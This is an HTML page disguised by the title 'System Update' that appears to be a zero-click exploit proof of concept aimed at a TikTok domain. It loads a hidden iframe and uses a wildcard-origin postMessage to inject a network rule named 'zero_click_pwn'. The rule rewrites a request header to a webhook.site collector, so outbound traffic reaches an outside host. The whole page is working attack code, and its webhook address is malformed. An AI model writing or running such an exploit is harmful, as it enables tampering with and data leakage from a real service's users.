<!DOCTYPE html>
<html>
<head><title>System Update</title></head>
<body>
    <iframe id="target" src="https://mcs-sg.tiktokv.com/v1/list" style="display:none;"></iframe>

    <script>
        const targetFrame = document.getElementById('target');
        const webhook = "https://webhook.site/https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";

        function sendExploit() {
            console.log("Attempting Zero-Click Injection...");
            
            const payload = {
                source: "main_thread", // Sesuai pns_logic.js baris awal
                eventName: "network_rule",
                data: [{
                    ruleName: "zero_click_pwn",
                    global: true,
                    conditions: [],
                    handlers: [{
                        handler: "replace",
                        type: "header",
                        field: "X-Pns-Referrer",
                        value: webhook
                    }]
                }]
            };

            // Kirim pesan ke semua window yang terbuka (broadcast style)
            targetFrame.contentWindow.postMessage(payload, "*");
            
            // Tambahan: Kirim ke opener juga kalau ada
            if (window.opener) {
                window.opener.postMessage(payload, "*");
            }
        }

        targetFrame.onload = function() {
            console.log("Iframe loaded successfully!");
            setTimeout(sendExploit, 2000);
            
            // Trigger fetch otomatis buat aktivasi rules
            setTimeout(() => {
                fetch("https://mcs-sg.tiktokv.com/v1/list", {mode: 'no-cors'});
            }, 4000);
        };
    </script>
</body>
</html>
